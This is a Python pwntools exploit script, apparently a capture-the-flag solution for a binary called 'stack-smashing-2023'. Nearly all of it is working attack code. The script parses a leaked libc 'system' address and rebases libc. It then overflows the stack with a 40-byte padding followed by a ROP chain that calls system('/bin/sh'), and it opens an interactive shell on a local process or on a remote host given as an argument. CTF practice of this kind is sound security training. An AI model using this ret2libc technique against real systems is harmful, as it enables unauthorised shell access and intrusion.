#!/usr/bin/python3.8
from pwn import *
import os

os.chdir('../setup')
elf = context.binary = ELF("stack-smashing-2023")
libc = elf.libc
context.terminal = ['tilix', '-a', 'session-add-down', '-e']
gs = '''
init-pwndbg
c
'''

# wrapper functrns
def sl(x): r.sendline(x)
def sla(x, y): r.sendlineafter(x, y)
def se(x): r.send(x)
def sa(x, y): r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        HOST = args.R.split(':')[0]
        PORT = args.R.split(':')[1]
        return remote(HOST, PORT)
    else:
        return process(elf.path)

r= run()
# =-=-=-= GADGETS / addresses -=-=-=-
rop = ROP(elf)


# =-=-=-=-= Main Exploit -=-=-=
OFFSET = 40  # cyclic_find(0x6161616161616166, n=8)

ru(': ')
system = int(rl().strip(), 16)
libc.address = system - libc.sym.system

rop.call(libc.sym.system, (next(libc.search(b'/bin/sh\x00')),))
payload = cyclic(128, n=8)
payload = b'A' * OFFSET
payload += rop.chain()

sl(payload)

# ====================================
r.interactive()
